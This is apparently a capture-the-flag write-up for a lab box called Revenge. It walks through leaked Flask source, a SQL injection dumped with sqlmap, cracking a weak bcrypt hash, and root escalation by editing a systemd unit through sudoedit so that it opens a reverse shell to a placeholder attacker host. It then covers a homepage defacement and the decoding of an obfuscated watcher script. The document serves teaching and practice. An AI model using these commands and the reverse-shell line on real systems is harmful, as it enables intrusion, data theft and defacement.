Revenge starts like a typical web box and ends somewhere much more interesting. The initial foothold comes from a source code leak that hands over the exact SQL injection point, but the real payoff is in what happens after root — a background process that only reveals itself once you know where to look, wrapped in two layers of shell obfuscation.

## Reconnaissance

```bash
nmap -sC -sV -p22,80 <TARGET_IP> -oN nmap.txt

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
```

Just two ports: SSH, and a web app ("Rubber Ducky Inc.") sitting behind nginx as a reverse proxy for what turned out to be a Flask/gunicorn backend.

## Source Code Disclosure

```bash
gobuster dir -u http://<TARGET_IP>/ -w /usr/share/wordlists/dirb/common.txt -x html,php,txt,js,json,bak,old,zip,env,git,yml,yaml,config,py -b 400,403,404 -t 30 -q

admin                (Status: 200) [Size: 4983]
app.py               (Status: 200) [Size: 2371]
contact              (Status: 200) [Size: 6906]
index                (Status: 200) [Size: 8541]
login                (Status: 200) [Size: 4980]
products             (Status: 200) [Size: 7254]
```

`app.py` being listed there is the interesting part — the application's own Flask source, served straight from the web root with no authentication in front of it.

Reading through it handed over everything at once: MySQL credentials (`root` / `PurpleElephants90!` for the `duckyinc` database), a Flask `secret_key`, and — helpfully commented right above the vulnerable line — the SQL injection itself:

```python
rs = con.execute(f"SELECT * FROM product WHERE id={product_id}")
```

An f-string dropped straight into a query, no parameterization at all, on `/products/<product_id>`. MySQL itself wasn't reachable directly (port 3306 never showed up in the scan), so this injection is the only way in to the database.

I also poked at `/admin`, since the login form was right there in the HTML — but the route in `app.py` only accepts `GET`, so no credentials were ever going to get processed through it.

## SQL Injection

```bash
sqlmap -u "http://<TARGET_IP>/products/1" --dbs --batch

Type: UNION query
Title: Generic UNION query (NULL) - 8 columns

back-end DBMS: MySQL >= 5.0.12
available databases [5]: duckyinc, information_schema, mysql, performance_schema, sys
```

UNION-based, 8 columns, MySQL confirmed. Dumping came down to one small quirk — letting sqlmap pick its own database and tables worked better than pointing it at `duckyinc` explicitly with `-D`/`-T`, which kept failing on column extraction:

```bash
sqlmap -u "http://<TARGET_IP>/products/1" --dump --batch
```

The `system_user` table held three bcrypt hashes. Two were hashed at cost factor 12, but one — `sadmin` — was hashed at cost 08, a massive difference in cracking time.

```bash
hashcat -m 3200 -a 0 sadmin.hash ~/SecurityTools/wordlists/rockyou.txt

sadmin: inuyasha
```

Four seconds, thanks to that lower cost factor.

## Privilege Escalation via sudoedit

```bash
sudo -l

User server-admin may run the following commands on <TARGET_IP>:
    (root) /bin/systemctl start duckyinc.service, enable, restart, daemon-reload, sudoedit /etc/systemd/system/duckyinc.service
```

`sudoedit` on a systemd unit file is effectively root, once you know what to do with it. The original file runs gunicorn as an unprivileged `flask-app` user:

```ini
[Service]
User=flask-app
Group=www-data
ExecStart=/usr/local/bin/gunicorn --workers 3 --bind=unix:/var/www/duckyinc/duckyinc.sock --timeout 60 -m 007 app:app
```

Editing just `ExecStart` and leaving `User=`/`Group=` in place doesn't help — the service still drops to `flask-app` before running anything. Removing both lines entirely is what matters: systemd defaults to running the service as root when no user is specified.

```ini
[Service]
ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/<ATTACKER_IP>/<ATTACKER_PORT> 0>&1'
```

```bash
sudo /bin/systemctl daemon-reload
sudo /bin/systemctl restart duckyinc.service
```

A reverse shell landed as root.

## Defacing the Site

The room's backstory — a note signed "Billy Joel," found earlier while poking around — frames the objective clearly: get root, then deface the homepage without taking the site down. Checking `/root` right after getting the shell showed nothing had happened yet, just a default `snap` folder.

Editing the template directly did the job:

```bash
nano /var/www/duckyinc/templates/index.html
```

```html
<h1 style="color:red">HACKED</h1>
```

One thing tripped me up here: `index.html` extends a base template with Jinja2 ({% raw %}`{% extends "base.html" %}`{% endraw %}, wrapped in {% raw %}`{% block content %}...{% endblock %}`{% endraw %}). Anything appended after that closing {% raw %}`{% endblock %}`{% endraw %} — say, from a blind `echo >>` at the end of the file — gets silently dropped when Jinja2 renders the page. The file changes on disk, but the browser never sees it. The fix is inserting the new content inside the existing block structure, not just tacking it onto the end of the file.

Checking `/root` again right after saving showed something new had appeared almost immediately.

Worth noting: none of this actually required root. `index.html` is `-rw-rw----`, owned by `flask-app` with group `www-data`, and `server-admin` is a member of that group — enough to modify existing file content. What root *did* buy was the ability to create new files in `templates/` (the directory itself is `drwxr-x---`, no group write) and to read whatever showed up under `/root` afterward.

## What's Actually Watching

Every writeup I found for this room describes that last step as something that "just happens" once you edit the file, without ever explaining the mechanism. Root's own crontab has the answer:

```bash
crontab -l

@reboot   /etc/aGwefdfsfd/.../mangled.sh
```

That entry lives in root's personal crontab (`/var/spool/cron/crontabs/root`), not `/etc/crontab` — which is why a casual `cat /etc/crontab` never turns it up.

The script itself runs at boot and is obfuscated with Bashfuscator (conveniently still installed at `/opt/Bashfuscator`), stacked in two layers: a character array reconstructed through `printf` and a list of indices, followed by hundreds of `printf` calls that each MD5-hash a fixed string and pull two hex characters out of the result to rebuild the real script byte by byte.

Rather than run any of that blind, I intercepted the output right before each layer would have executed:

```bash
sed 's/|\$BASH$/> \/tmp\/decoded_payload.txt/' mangled.sh > /tmp/mangled_safe.sh
bash /tmp/mangled_safe.sh
cat /tmp/decoded_payload.txt
```

```bash
sed 's/^eval /echo /' /tmp/decoded_payload.txt > /tmp/mangled_safe2.sh
bash /tmp/mangled_safe2.sh > /tmp/decoded_final.txt
cat /tmp/decoded_final.txt
```

On some deployments this comes out reversed character-by-character — piping through `rev | tac` fixes that.

What came out was a simple integrity watcher:

```bash
unmodified_sum=$(md5sum /var/www/duckyinc/templates/index.html | cut -d ' ' -f 1)

while :
do
    modified_sum=$(md5sum /var/www/duckyinc/templates/index.html | cut -d ' ' -f 1)
    if [ "$unmodified_sum" != "$modified_sum" ]; then
        : # writes the stage's completion marker under /root
    fi
done
```

Running since boot, comparing the file's MD5 against its original value in a tight loop, and dropping something into `/root` the moment it detects a change. Not magic — just a watcher process that was there the entire time.

A quick `ps aux | grep mangled` confirms it's running, in case you want to check before touching the template at all.

## Key Takeaways

**A source code leak is often a roadmap, not just a data leak.** `app.py` didn't just expose credentials — it pointed straight at the exact vulnerable line, with the vulnerability visible in the comment above it. Worth treating any exposed source file as a shortcut to the exploit, not just a pile of secrets.

**Bcrypt cost factor is a visible signal, not just an implementation detail.** Three hashes from the same table, two expensive and one cheap, is a strong hint about which one the room wants cracked first.

**"It just works" deserves investigation.** That last completion marker didn't appear through some abstract game mechanic — it was a real background process, launched at boot, watching a file's hash in a loop. Obfuscated shell scripts can be read safely by intercepting their output right before the point they'd normally execute, one layer at a time, instead of running them and hoping for the best.
